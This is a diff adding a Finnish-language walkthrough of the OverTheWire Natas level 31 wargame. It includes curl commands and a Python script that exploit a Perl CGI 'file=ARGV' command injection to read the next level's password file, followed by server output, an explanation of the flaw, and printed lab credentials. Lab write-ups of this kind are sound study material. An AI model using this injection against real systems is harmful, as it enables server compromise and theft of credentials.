@@ -79,6 +79,8 @@ if ($cgi->upload('file')) {
 
 ## kali linux testausta - START HERE;
 
+Tässä alkuun normaalia, pientä testausta ja tarkistusta
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas7.natas.labs.overthewire.org" 
@@ -168,10 +170,291 @@ the credentials required.</p>
 ```
 
 
+Tämä on vain malli ja yksi osa: `$curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=@natas31.csv;type=text/csv"`
+
+Sama lisää testausta ja tarkistuksena, että miksi ja näin:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl?etc/natas_webpass/natas32" -F "file=ARVG" -F "file=/Downloads/book1.csv"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- morla/10111 -->
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
 
 
+<h1>natas31</h1>
+<div id="content">
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>    
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form> 
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+```
+
+Lisää curl komentojen testausta ja tarkistusta, sekä tässä vähittelen tulee kun yritettään upottaa tiedostoa sinne nettisivuston polkuun ja käyttäen tätä olemassa olevaa excel taulukon rakennetta eli yritettään saada pelittää.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=Downloads/Book1.csv;type=text/csv" 
+```
+
+Toinen testi:
+```
+$curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
+  -F "submit=Upload" \
+  -F "file=@Book1.csv;type=text/csv" \
+  http://natas31.natas.labs.overthewire.org/index.pl
+  ```
 
 
+**METHOD 1 (Python skripti):**
+Tää on se toimiva Python skripti osuus, eli alemmaksi menee niin se toimii, tässä kali linux ohjelman alle laitoin "Book1.csv" excel taulukon normi copy-paste.
+
+```
+┌──(kali㉿kali)-[~/Desktop/Python koodit]
+└─$ cat pythonkoodi31.py
+#!/usr/bin/env python3
+import requests
+
+auth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')
+base_url = 'http://natas31.natas.labs.overthewire.org/index.pl'
+
+# Komentoinjektio URL:iin
+url = base_url + '?cat+/etc/natas_webpass/natas32+|'
+
+# Lähetetään parametri file=ARGV (triggeröi komentoinjektion Perlin <ARGV>-käsittelyyn)
+data = {'file': 'ARGV'}
+
+# Tiedosto joka lähetetään (sisällöllä ei ole väliä, mutta sen on oltava olemassa!)
+files = {'file': open('/home/kali/Downloads/Book1.csv', 'r')}  # <- muokkaa polku tarpeen mukaan
+
+# POST-pyyntö CGI:lle
+resp = requests.post(url, auth=auth, data=data, files=files)
+
+# Tulostetaan palvelimen vastaus
+print(resp.text)
+```
+
+
+toimiva versio (aikaisempi python skriptissä oli kirjoitus virhettä ja tässä piti määrittää toi polku)
+```
+┌──(kali㉿kali)-[~/Desktop/Python koodit]
+└─$ python pythonkoodi31.py
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- morla/10111 -->
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas31</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+**TOINEN METHODI**, 
+en uskonut tämäkin toimii mutta piti apua saada chatgpt:ltä ehdottomasti, koska testataan curl komentoa:
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y \
+  -F "submit=Upload" \
+  -F "file=ARGV" \
+  -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv" \
+  "http://natas31.natas.labs.overthewire.org/index.pl?cat+/etc/natas_webpass/natas32+|"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- morla/10111 -->
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas31</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+## pieni yhteenveto ja tutkiminen
+
+Natas31:ssä kyse on nimenomaan Perl CGI -skriptin haavoittuvuudesta, joka liittyy tiedoston käsittelyyn ja komentoinjektioon
+
+
+Kyseessä on **Remote Code Execution (RCE)** haavoittuvuus, joka syntyy siitä, että käyttäjän syötettä (parametria file) käytetään suoraan tiedoston lukemiseen ilman tarkistusta:
+```
+my $file = $cgi->param('file');
+while (<$file>) {
+   ...
+}
+```
+
+ongelmana:
+- Perl CGI käyttää käyttäjän syötettä suoraan tiedoston lukemiseen.
+- Perl käsittelee tietyt merkkijonot, kuten `|komento`, erityisesti: se ajaa ne komentona.
+- `file=ARGV` pakottaa Perlin lukemaan komentorivin argumentteja tiedostoina.
+- Jos samalla URL:issa on injektoitu `|cat ...`, Perl suorittaa sen komentona.
+- Tämä on klassinen **command injection** -haavoittuvuus, johtuen puutteellisesta syötteen validoinnista.
+
+
+Jos testaisi toimisiko tämä hyökkäys pelkästään URL-injektiona, ilman tiedoston latausta, ja voiko tätä ajatella lineaarisesti:
+- vastauksena: Ei, pelkkä URL-injektio ei riitä tässä tapauksessa – tiedoston lähettäminen (multipart/form-data) on välttämätöntä, jotta Perl CGI suostuu käsittelemään `file=...` niin kuin se tekee tässä haavoittuvuudessa.
+
+
+Kuitenkin Natas31-harjoituksen ideana on hyödyntää CGI-skriptin haavoittuvuutta, jossa tiedoston latauksen yhteydessä voidaan suorittaa komentoinjektio. Käyttämällä esim. Burp Suitea, Python skriptillä tai curl-komentoa sekä satunnaista .csv-tiedostoa, voidaan ohittaa normaali toiminta ja suorittaa palvelimella komento, joka paljastaa natas32-tason salasanan.
+
+
+## harjoitus ja lisätietoa links
+
+https://learnhacking.io/overthewire-natas-level-31-walkthrough/
+
+
+https://miaxu-src.github.io/natas/2021/09/17/natas31-walkthrough.html
+
+
+https://lioxliu.wordpress.com/2020/12/27/overthewire-natas-level-31/
+
+
+---
+
+# natas 32 - start here;
+
+natas32 : NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
 
 
 
